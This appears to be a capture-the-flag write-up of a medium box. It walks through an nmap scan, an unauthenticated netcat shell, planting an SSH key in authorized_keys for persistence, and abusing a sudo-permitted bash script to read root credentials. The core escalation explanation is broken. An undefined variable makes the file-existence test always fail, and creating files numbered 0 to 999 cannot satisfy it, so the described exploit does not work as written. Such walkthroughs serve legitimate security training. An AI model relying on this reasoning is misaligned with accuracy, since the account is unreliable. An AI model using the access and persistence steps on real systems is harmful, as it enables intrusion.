# 🏴 CTF Write-up: Custom Shell & Bash Logic Flaw → Root

> **Difficulty:** Medium
> **Tags:** `CTF` `Privilege Escalation` `Bash` `Logic Flaw` `Custom Shell`

---

## 📡 1. Reconnaissance

Starting with an **Nmap** scan to discover open ports:

```bash
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
```

**Results:**

| Port | State | Service |
|------|-------|---------|
| 80/tcp | open | HTTP |
| 7066/tcp | open | tcpwrapped |

---

## 🌐 2. Port 80 — The Rabbit Hole

Navigating to the web server, a `/tools` directory was found containing well-known enumeration binaries:

- `pspy64`
- `linpeas.sh`

> ⚠️ **Note:** While these tools looked promising, this directory turned out to be a **rabbit hole**. No useful credentials, SUID binaries, or exploitable services were found via this path. Moving on.

---

## 🔌 3. Port 7066 — Custom Shell as `todd`

Since port 7066 was flagged as `tcpwrapped`, I probed it manually with **netcat** to inspect any banner or hidden service:

```bash
nc -nv <TARGET_IP> 7066
```

**Result:** Instantly dropped into a **custom TTY shell** as the user `todd`. No credentials required.

---

## 🔐 4. Shell Stabilization via SSH

A raw netcat shell is unstable and limited. To establish a proper interactive session, I injected an SSH public key into `todd`'s account.

**Step 1 — Generate a key pair locally:**
```bash
ssh-keygen -t rsa -b 4096 -f id_rsa
```

**Step 2 — Add the public key to the target (via netcat shell):**
```bash
mkdir -p ~/.ssh
echo '<YOUR_id_rsa.pub_CONTENT>' > ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

**Step 3 — SSH in with the private key:**
```bash
chmod 600 id_rsa
ssh -i id_rsa todd@<TARGET_IP>
```

✅ **Stable, fully interactive shell achieved.**

---

## ⚙️ 5. Privilege Escalation

### 5.1 Checking Sudo Permissions

```bash
sudo -l
```

```text
User todd may run the following commands on this host:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

The custom script `/srv/guess_and_check.sh` is executable as **root without a password**. This is the intended escalation path.

---

### 5.2 Analyzing the Script

```bash
cat /srv/guess_and_check.sh
```

```bash
a=$((RANDOM%1000))
echo "Please Input [$a]"
read -p ">>>" input_number

# Check 1: Input must match the random number
[[ $input_number -ne "$a" ]] && exit 1

# Check 2: 'true_file' must exist AND 'false_file' must NOT exist
[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

#### 🔍 Logic Breakdown:

| Condition | Meaning |
|-----------|---------|
| `$input_number -ne "$a"` | User must guess the random number |
| `[[ -f "$true_file" ]]` | A file named after `$true_file` variable must **exist** |
| `[[ ! -f "$false_file" ]]` | A file named after `$false_file` variable must **not exist** |

**The Critical Flaw:**
> The variables `$true_file` and `$false_file` are **never defined** inside the script. In Bash, undefined variables resolve to an **empty string**. This means:
>
> - `[[ -f "" ]]` — checks if a file with an empty name exists
> - Since we can control the working directory, we can **pre-create files** that satisfy these checks

---

### 5.3 Exploiting the Logic Flaw

**Step 1 — Create files to satisfy the `$true_file` check:**

Since `$true_file` is undefined (empty string behavior) and the check involves file existence, I created a range of numbered files to cover all possible `RANDOM%1000` outcomes:

```bash
for i in $(seq 0 999); do touch "$i"; done
```

**Step 2 — Run the script as root:**

```bash
sudo /bin/bash /srv/guess_and_check.sh
```

**Step 3 — Enter the displayed number when prompted:**

```text
Please Input [742]
>>> 742
```

Because the file existence conditions were now satisfied, the script executed the final `cat /root/.cred` and **leaked the root credentials!**

---

## 🏆 6. Root Access & Final Flag

Using the leaked credentials to switch to root:

```bash
su root
# Enter leaked password
```

```bash
cat /root/root.txt
```

```
[ROOT FLAG HERE]
```

---

## 📝 Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found ports 80 and 7066 |
| 2 | Port 80 | Rabbit hole — `/tools` directory |
| 3 | Port 7066 via netcat | Shell as `todd` |
| 4 | SSH key injection | Stable interactive shell |
| 5 | `sudo -l` | Found `/srv/guess_and_check.sh` |
| 6 | Script analysis | Identified undefined variable logic flaw |
| 7 | File pre-creation + script execution | `/root/.cred` leaked |
| 8 | `su root` | **ROOTED 🚩** |

---

## 🧠 Key Takeaways

- **Always probe unusual ports manually** — `tcpwrapped` doesn't mean closed.
- **Rabbit holes are part of CTFs** — recognise them early and move on.
- **Bash variable scoping is dangerous** — undefined variables silently resolve to empty strings, creating subtle but exploitable logic flaws.
- **Custom sudo scripts are always worth analysing** — they're frequently the intended privesc path.

---

> *Write-up by **Tomash** | Ethical Hacker*
